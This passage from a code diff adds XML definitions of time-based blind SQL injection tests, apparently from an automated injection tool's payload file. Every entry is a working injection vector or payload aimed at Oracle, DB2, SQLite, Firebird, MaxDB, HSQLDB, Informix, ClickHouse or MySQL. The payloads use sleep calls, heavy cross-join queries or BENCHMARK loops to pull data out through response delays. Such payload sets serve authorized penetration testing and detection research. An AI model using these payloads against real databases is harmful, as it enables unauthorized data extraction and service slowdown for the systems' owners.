+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle AND time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle OR time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 AND time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 OR time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite &gt; 2.0 AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite &gt; 2.0 OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite &gt; 2.0 AND time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite &gt; 2.0 OR time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>Firebird &gt;= 2.0 AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+            <dbms_version>&gt;= 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>Firebird &gt;= 2.0 OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+            <dbms_version>&gt;= 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>Firebird &gt;= 2.0 AND time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+            <dbms_version>&gt;= 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>Firebird &gt;= 2.0 OR time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+            <dbms_version>&gt;= 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>SAP MaxDB AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SAP MaxDB OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SAP MaxDB AND time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SAP MaxDB OR time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>HSQLDB &gt;= 1.7.2 AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END</vector>
+        <request>
+            <payload>AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>HSQLDB</dbms>
+            <dbms_version>&gt;= 1.7.2</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>HSQLDB &gt;= 1.7.2 OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END</vector>
+        <request>
+            <payload>OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>HSQLDB</dbms>
+            <dbms_version>&gt;= 1.7.2</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>HSQLDB &gt;= 1.7.2 AND time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END</vector>
+        <request>
+            <payload>AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>HSQLDB</dbms>
+            <dbms_version>&gt;= 1.7.2</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>HSQLDB &gt;= 1.7.2 OR time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END</vector>
+        <request>
+            <payload>OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>HSQLDB</dbms>
+            <dbms_version>&gt;= 1.7.2</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>HSQLDB &gt; 2.0 AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END</vector>
+        <request>
+            <payload>AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>HSQLDB</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>HSQLDB &gt; 2.0 OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END</vector>
+        <request>
+            <payload>OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>HSQLDB</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>HSQLDB &gt; 2.0 AND time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END</vector>
+        <request>
+            <payload>AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>HSQLDB</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>HSQLDB &gt; 2.0 OR time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END</vector>
+        <request>
+            <payload>OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>HSQLDB</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>Informix AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Informix</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Informix OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Informix</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Informix AND time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Informix</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Informix OR time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Informix</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>ClickHouse AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(if(([INFERENCE]), 1000000, 1)))</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(1000000))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>ClickHouse</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>ClickHouse OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(if(([INFERENCE]), 1000000, 1)))</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(1000000))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>ClickHouse</dbms>
+        </details>
+    </test>
+
+    <!-- End of time-based boolean tests -->
+
+    <!-- Time-based boolean tests - Numerous clauses -->
+    <!-- This payload does not work with SLEEP() -->
+    <test>
+        <title>MySQL &gt;= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1</where>
+        <vector>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)</vector>
+        <request>
+            <payload>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1</where>
+        <vector>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)</vector>
+        <request>
+            <payload>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+    <!-- End of time-based boolean tests - Numerous clauses -->
+
+    <!-- Time-based boolean tests - Parameter replace -->
+    <test>
+        <title>MySQL &gt;= 5.0.12 time-based blind - Parameter replace</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
